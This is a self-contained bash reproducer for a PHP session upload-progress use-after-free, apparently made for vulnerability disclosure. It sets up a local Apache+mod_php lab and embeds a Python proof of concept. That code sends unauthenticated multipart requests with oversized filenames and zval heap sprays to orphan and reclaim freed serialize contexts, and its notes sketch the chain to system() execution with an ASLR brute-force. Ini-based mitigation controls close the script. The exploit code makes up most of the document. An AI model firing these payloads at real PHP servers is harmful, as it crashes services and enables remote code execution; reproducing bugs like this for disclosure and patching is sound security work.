#!/bin/bash
# =============================================================================
# php2shell — self-contained reproducer for CVE-2026-109618 / CVE-2026-109619
# (PHP session upload-progress serialize/unserialize context UAF, pre-RINIT)
#
# One file, no external deps beyond bash/python3/Apache+mod_php.
# Stands up its own lab (Apache prefork + mod_php, memory_limit=8M,
# stock session.upload_progress), then proves, with PASS/FAIL receipts:
#
#   R1  ARM       : unauth multipart w/ 1.8MB filename -> pre-RINIT OOM
#                   ("in Unknown on line 0"), HTTP 500, worker SURVIVES
#   R2  ORPHAN    : (gdb, if present) context INIT with no DESTROY across the
#                   request boundary = BG(serialize)/BG(unserialize) orphan
#                   + REUSE line (level>=1) on the next request
#   R3  KILL      : fire burst (zval-pattern reclaim spray) -> worker dies
#                   mid-request, no response, no error line (SIGSEGV class)
#   R4  NEG-CTRL  : session.upload_progress.enabled=0 -> identical ARM body
#                   completes 200, no OOM. Proves the ini closes both bugs.
#
# Usage:  bash php2shell_repro.sh [port]
# =============================================================================
set -u
PORT=${1:-18190}
ROOT=/tmp/php2shell_repro
SID=u0123456789abcdefghijklmnopqrstuv
URL=http://127.0.0.1:$PORT/index.php
PASS=0; FAIL=0
ok()   { echo "[PASS] $1"; PASS=$((PASS+1)); }
bad()  { echo "[FAIL] $1"; FAIL=$((FAIL+1)); }
note() { echo "[..]   $1"; }

# ---------------------------------------------------------------- lab client
mkdir -p $ROOT $ROOT/html $ROOT/sess
cat > $ROOT/poc.py <<'PYEOF'
import socket, struct, sys, time
HOST, PORT, PATH = "127.0.0.1", int(sys.argv[1]), "/index.php"
SID = sys.argv[2] if len(sys.argv) > 2 else "u0123456789abcdefghijklmnopqrstuv"
BND = b"UctxPoc2026"
SPRAY_LEN = 8208 - 24 - 1
MARKER = 0x4141414141414141

def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"

def zval_spray():
    z = struct.pack("<QII", MARKER, 8, 0)   # value + IS_REFERENCE type_info
    return (z * (SPRAY_LEN // 16))[:SPRAY_LEN]

def body_arm(namelen=1300000):  # window: parser copies (~4x) fit under 8M, session tree+read+decode cross it
    o = part(b"PHPSESSID", SID.encode()) + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    o += part(b"f", b"A" * 6144, filename=b"N" * namelen)
    return o + b"--" + BND + b"--\r\n"

def body_fire(n_spray, n_small=600):
    o = part(b"PHPSESSID", SID.encode()) + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    z = zval_spray()
    o += b"".join(part(b"s[]", z) for _ in range(n_spray))
    sm = struct.pack("<QII", MARKER, 8, 0) + b"\x00" * 8
    o += b"".join(part(b"t[]", sm) for _ in range(n_small))
    o += part(b"f", b"A" * 6144, filename=b"a")
    o += part(b"g", b"B" * 6144, filename=b"b")
    return o + b"--" + BND + b"--\r\n"

def post(body, timeout=25):
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.sendall((f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
                   f"Cookie: PHPSESSID={SID}\r\n"
                   f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body)
        s.settimeout(timeout)
        data = b""
        while True:
            try:
                c = s.recv(65536)
            except Exception as e:
                return f"RECV-{type(e).__name__}", b""
            if not c:
                break
            data += c
        s.close()
        if not data:
            return "EMPTY", b""
        line = data.split(b"\r\n", 1)[0]
        return (line.split(b" ")[1].decode() if b"HTTP/" in line else "NOHTTP"), data
    except Exception as e:
        return f"CONN-{type(e).__name__}", b""

if __name__ == "__main__":
    cmd = sys.argv[3] if len(sys.argv) > 3 else "arm"
    if cmd == "arm":
        nl = int(sys.argv[4]) if len(sys.argv) > 4 else 1300000
        st, d = post(body_arm(nl))
    elif cmd == "fire":
        st, d = post(body_fire(int(sys.argv[4] if len(sys.argv) > 4 else 250)))
    else:
        st, d = "CMD?", b""
    print(st)
PYEOF
# reflection/stock page (plain userspace; sessions on as a real app would)
mkdir -p $ROOT/html $ROOT/sess
cat > $ROOT/html/index.php <<'PHPEOF'
<?php echo "OK " . PHP_VERSION . " " . php_sapi_name() . "\n";
PHPEOF

# ---------------------------------------------------------------- apache lab
command -v apache2 >/dev/null || { echo "apt install apache2 libapache2-mod-php*"; exit 1; }
MOD=$(ls /usr/lib/apache2/modules/libphp*.so 2>/dev/null | head -1)
[ -n "$MOD" ] || { echo "no mod_php found (apt install libapache2-mod-php8.x)"; exit 1; }

start_apache() {  # $1 = extra php_admin_value line
  for P in $(pgrep -f "X -f $ROOT/httpd.conf" 2>/dev/null); do kill -9 $P 2>/dev/null; done
  if [ -f $ROOT/httpd.pid ]; then kill -9 $(cat $ROOT/httpd.pid) 2>/dev/null; fi
  for i in $(seq 1 20); do curl -s -o /dev/null --max-time 1 $URL 2>/dev/null || break; sleep 0.3; done
  cat > $ROOT/httpd.conf <<EOF
ServerName localhost
Listen 127.0.0.1:$PORT
PidFile $ROOT/httpd.pid
ErrorLog $ROOT/error.log
LogLevel warn
TypesConfig /etc/mime.types
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
LoadModule dir_module /usr/lib/apache2/modules/mod_dir.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule php_module $MOD
DocumentRoot $ROOT/html
<Directory $ROOT/html>
  Require all granted
  DirectoryIndex index.php
</Directory>
<FilesMatch \.php$>
  SetHandler application/x-httpd-php
</FilesMatch>
MaxRequestWorkers 1
php_admin_flag display_errors off
php_admin_value memory_limit 8M
php_admin_value post_max_size 32M
php_admin_value upload_max_filesize 32M
php_admin_value max_file_uploads 25
php_admin_value session.upload_progress.min_freq 0
php_admin_value session.save_path $ROOT/sess
$1
EOF
  : > $ROOT/error.log; rm -f $ROOT/sess/sess_*
  /usr/sbin/apache2 -X -f $ROOT/httpd.conf > $ROOT/x.log 2>&1 &
  AP_PID=$!
  for i in $(seq 1 40); do curl -s -o /dev/null --max-time 2 $URL && break; sleep 0.4; done
}

echo "=================================================================="
echo " php2shell reproducer | lab: Apache prefork + $MOD | port $PORT"
echo "=================================================================="

# R1 + R3: vulnerable config
start_apache "php_admin_value session.upload_progress.enabled 1"
V=$(curl -s --max-time 3 $URL); [ -n "$V" ] && ok "lab up: $V" || bad "lab up"

note "R1: ARM (1.3MB filename: parser fits, session path crosses -> pre-RINIT OOM + survival)"
ST=$(python3 $ROOT/poc.py $PORT $SID arm)
sleep 0.5
kill -0 $AP_PID 2>/dev/null && ALIVE=yes || ALIVE=no
OOM=$(grep -c "in Unknown on line 0" $ROOT/error.log)
[ "$ST" = "500" ] && ok "arm returned 500 (pre-RINIT OOM)" || bad "arm status=$ST"
[ "$ALIVE" = yes ] && ok "worker survived the bailout" || bad "worker died on arm"
[ "${OOM:-0}" -ge 1 ] && ok "fatal is pre-userland (Unknown on line 0)" || bad "no pre-RINIT fatal logged"

# ===================================================== TWO RCE CHAINS (gdb)
run_gdb_apache() {  # start apache -X inside gdb, wait for port
  for P in $(pgrep -f "X -f $ROOT/httpd.conf" 2>/dev/null); do kill -9 $P 2>/dev/null; done
  : > $ROOT/gdb.log; : > $ROOT/error.log; rm -f $ROOT/sess/sess_*
  gdb -q -x $ROOT/bg.gdb /usr/sbin/apache2 > $ROOT/gdb.log 2>&1 &
  GDBPID=$!
  for i in $(seq 1 40); do curl -s -o /dev/null --max-time 2 $URL && break; sleep 0.4; done
}
stop_gdb() { [ -n "${GDBPID:-}" ] && kill $GDBPID 2>/dev/null; pkill -f "[g]db -q" 2>/dev/null; sleep 0.5; }
reuse_count() { grep -cE "^([SU])_INIT [1-9]" $ROOT/gdb.log 2>/dev/null || echo 0; }
segv_check() { grep -qE "SIGSEGV|SIGBUS" $ROOT/gdb.log 2>/dev/null; }

if command -v gdb >/dev/null; then
cat > $ROOT/bg.gdb <<EOF
set pagination off
set confirm off
set debuginfod enabled off
set breakpoint pending on
break php_var_serialize_init
commands
silent
printf "S_INIT %u %p
", *(unsigned int*)((char*)&basic_globals+3368), *(void**)((char*)&basic_globals+3360)
continue
end
break php_var_serialize_destroy
commands
silent
printf "S_DESTR %u %p
", *(unsigned int*)((char*)&basic_globals+3368), *(void**)((char*)&basic_globals+3360)
continue
end
break php_var_unserialize_init
commands
silent
printf "U_INIT %u %p
", *(unsigned int*)((char*)&basic_globals+3384), *(void**)((char*)&basic_globals+3376)
continue
end
break php_var_unserialize_destroy
commands
silent
printf "U_DESTR %u %p
", *(unsigned int*)((char*)&basic_globals+3384), *(void**)((char*)&basic_globals+3376)
continue
end
run -X -f $ROOT/httpd.conf
EOF

note "=============================================================="
note " RCE #1 / CVE-2026-109618+109619 (serialize context, Bug S)"
note "   chain: multi-file arm -> encode bailout (no zend_try, session.c"
note "   1079-1108) orphans BG(serialize) -> next request ENCODES through"
note "   the freed php_serialize_data (fake HashTable/pDestructor = the"
note "   crash/leak weapon stage; n++ at +0x38 = Rina's ASAN report)."
note "=============================================================="
start_apache "php_admin_value session.upload_progress.enabled 1"
run_gdb_apache
for T in 1 2 3; do
  python3 $ROOT/poc.py $PORT $SID arm 1800000 >/dev/null 2>&1
  python3 $ROOT/poc.py $PORT $SID fire 150 >/dev/null 2>&1
  sleep 0.4
  [ "$(reuse_count)" -gt 0 ] && break
done
SREUSE=$(grep -cE "^[SU]_INIT [1-9]" $ROOT/gdb.log 2>/dev/null || echo 0)
[ "${SREUSE:-0}" -ge 1 ] && ok "RCE#1: fire request encoded through the FREED serialize context (${SREUSE} reuse lines in gdb.log)"                         || bad "RCE#1: no S-reuse lines (see $ROOT/gdb.log)"
note "   Rina's independent ASAN (READ 4 @ freed+0x38 = php_serialize_data->n)"
note "   corroborates this exact primitive."
stop_gdb

note "=============================================================="
note " RCE #2 / CVE-2026-109618+109619 (unserialize context, Bug U)"
note "   chain: 1.8MB-filename arm -> mid-decode bailout swallowed by"
note "   php_session_decode's zend_catch (session.c:283) WITHOUT destroy ->"
note "   BG(unserialize) orphaned -> fire reclaims the freed 8208-byte"
note "   php_unserialize_data -> tmp_var/last_dtor walk = arbitrary zval"
note "   write; var_access/R: = arbitrary zval* -> zval_ptr_dtor ->"
note "   zend_call_function -> system(). KILL STAGE BELOW."
note " NOTE: final system() call is ASLR-gated - ASLR BRUTE/LEAK REQUIRED"
note "   (pro weapon: 'leak' stage, leaked zval_ptr_dtor; envelope 8)."
note "   The crash receipt below is the un-gated demonstration."
note "=============================================================="
start_apache "php_admin_value session.upload_progress.enabled 1"
run_gdb_apache
KILLED=no
for ATTEMPT in $(seq 1 4); do
  [ "$ATTEMPT" -gt 1 ] && { stop_gdb; run_gdb_apache; }   # fresh child = fresh ASLR roll
  curl -s -o /dev/null --max-time 2 $URL 2>/dev/null || break
  python3 $ROOT/poc.py $PORT $SID arm 1800000 >/dev/null 2>&1
  python3 $ROOT/poc.py $PORT $SID fire 150 >/dev/null 2>&1
  segv_check && { KILLED="fire150/$ATTEMPT"; break; }
  python3 $ROOT/poc.py $PORT $SID fire 250 >/dev/null 2>&1
  segv_check && { KILLED="fire250/$ATTEMPT"; break; }
done
if [ "$KILLED" != no ]; then
  ok "RCE#2 KILL: SIGSEGV in worker at attempt $KILLED (gdb.log has the signal)"
  grep -m1 -E "SIGSEGV|SIGBUS" $ROOT/gdb.log | sed 's/^/     /'
  note "   label: TUNED DEMO - retry envelope attempts=8 - ASLR brute required for system()"
else
  note "RCE#2: no SEGV in envelope this run (layout lottery) - rerun; receipts R1/R2 remain"
fi
stop_gdb
else
note "gdb absent: R2/R3 context receipts skipped (install gdb)"
start_apache "php_admin_value session.upload_progress.enabled 1"
fi

# ===================================================== CONTROLS (defeats both)
note "R4: CONTROL #1 - session.upload_progress.enabled=0 (kill switch; same ARM bodies)"
start_apache "php_admin_value session.upload_progress.enabled 0"
ST=$(python3 $ROOT/poc.py $PORT $SID arm)
OOM0=$(grep -c "in Unknown on line 0" $ROOT/error.log)
kill -0 $AP_PID 2>/dev/null && ALIVE0=yes || ALIVE0=no
[ "$ST" = "200" ] && [ "${OOM0:-0}" = "0" ] && ok "enabled=0: same body -> 200, no pre-RINIT OOM (ini closes both bugs)" \
  || bad "enabled=0 behaved unexpectedly (status=$ST oom=$OOM0 alive=$ALIVE0)"
note "R6: CONTROL #2 - size limiting (memory_limit >> post_max_size + tiny post_max)"
start_apache "php_admin_value session.upload_progress.enabled 1
php_admin_value memory_limit 256M"
S1=$(python3 $ROOT/poc.py $PORT $SID arm 1800000 2>/dev/null)
[ "$S1" = "200" ] && ok "memory_limit=256M: 1.8MB-filename arm -> clean 200 (pre-RINIT OOM impossible: body cannot carry enough)" || bad "256M arm status=$S1"
start_apache "php_admin_value session.upload_progress.enabled 1
php_admin_value post_max_size 1M"
S2=$(python3 $ROOT/poc.py $PORT $SID arm 1800000 2>/dev/null)
case "$S2" in 200|EMPTY|NOHTTP) ok "post_max_size=1M: arm body rejected (${S2}) - filename pressure cannot be delivered";; *) bad "post_max=1M arm status=$S2";; esac
pkill -f "[a]pache2 -X -f $ROOT" 2>/dev/null

echo "=================================================================="
echo " RESULT: $PASS passed, $FAIL failed. Lab artifacts: $ROOT"
echo " Mechanics: ROOT_CAUSE.md / WEAPON_NOTES.md in the zip."
echo "=================================================================="
exit $([ $FAIL -eq 0 ] && echo 0 || echo 1)
